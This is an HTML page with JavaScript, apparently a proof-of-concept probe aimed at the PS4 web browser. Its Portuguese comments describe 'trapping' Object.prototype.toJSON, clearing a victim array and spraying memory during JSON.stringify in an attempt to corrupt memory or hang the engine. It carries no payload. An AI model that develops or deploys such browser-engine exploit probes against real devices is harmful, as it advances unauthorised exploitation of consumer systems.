<!DOCTYPE html>
<html>
<head>
    <title>PS4 X-Ray Debug V2 (Object Target)</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; font-size: 24px; }
        #log { border: 1px solid #0f0; padding: 10px; }
        .trap { color: #ff00ff; font-weight: bold; }
    </style>
</head>
<body>
    <h3>DEBUG V2: OBJECT TRAP</h3>
    <div id="log">Inicializando...</div>

    <script>
        const logDiv = document.getElementById('log');
        function log(msg, type='') {
            const div = document.createElement('div');
            div.innerText = msg;
            if(type) div.className = type;
            logDiv.appendChild(div);
        }

        async function runDebug() {
            log("1. Preparando Vítimas...");
            let victims = [];
            for(let i=0; i<100; i++) victims.push({a: 1, b: 2});
            
            log("2. Instalando Armadilha em Object.prototype...");
            
            // CORREÇÃO: Usamos Object.prototype, que sabemos que funciona no seu PS4
            Object.defineProperty(Object.prototype, "toJSON", {
                get: function() {
                    log(">>> ARMADILHA ATIVADA! CÓDIGO RODANDO! <<<", "trap");
                    
                    // O Ataque de Corrupção
                    log("3. Tentando corromper memória...");
                    victims.length = 0; // Esvazia array de referências
                    
                    // Spray pesado para forçar o crash se o motor estiver instável
                    let junk = new ArrayBuffer(1024 * 1024);
                    
                    log("4. Retornando da armadilha...");
                    return "pwned";
                }
            });

            log("5. Preparando Gatilho (Objeto)...");
            // CORREÇÃO: Usamos um Objeto, não um número
            let bait = [{ trigger: true }]; 
            
            await new Promise(r => setTimeout(r, 1000)); 
            
            log("6. DISPARANDO AGORA...");
            
            try {
                // Se o console congelar aqui (com a msg "ARMADILHA ATIVADA" na tela), 
                // é vitória.
                JSON.stringify(bait); 
                log("7. Sobreviveu (O bug existe, mas não causou Deadlock)");
            } catch(e) {
                log("Erro capturado: " + e.message);
            } finally {
                delete Object.prototype.toJSON;
            }
        }

        setTimeout(runDebug, 1000);
    </script>
</body>
</html>
